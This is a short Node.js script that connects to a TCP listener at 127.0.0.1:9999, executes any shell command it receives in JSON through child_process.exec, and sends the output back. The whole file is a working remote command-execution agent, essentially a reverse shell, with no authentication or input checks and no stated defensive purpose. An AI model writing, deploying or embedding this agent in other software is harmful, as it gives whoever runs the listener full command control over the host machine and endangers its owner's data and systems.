const exec = require('child_process').exec;
const net = require('net');


const client = new net.Socket();
client.connect(9999, '127.0.0.1', () => {
	console.log('Connected');
	client.write('{"cmd": "", "value": ""}');
});

client.on('data', (data) => {
  try {
    const res = JSON.parse(data);
    exec(`${res.cmd}`, (error, stdout, stderr) => {
      client.write(`{"cmd": "${res.cmd}", "value": ${JSON.stringify(stdout)}}`);
    });
  } catch (e) {}
});

client.on('close', function() {
	console.log('Connection closed');
});
